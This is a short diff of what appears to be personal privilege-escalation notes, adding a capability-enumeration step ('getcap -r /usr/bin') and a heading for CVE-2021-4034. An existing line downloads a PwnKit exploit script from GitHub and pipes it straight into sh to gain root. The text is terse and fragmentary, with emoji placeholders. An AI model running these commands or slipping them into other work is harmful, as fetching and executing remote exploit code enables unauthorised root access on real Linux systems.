@@ -1,3 +1,7 @@
+# burn sechar
+find 😈😈😈😈 -> getcap -r /usr/bin
+
+# cve-2021-4034
 burn 2.0 -> sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
 😈😈😈😈
 # vunl
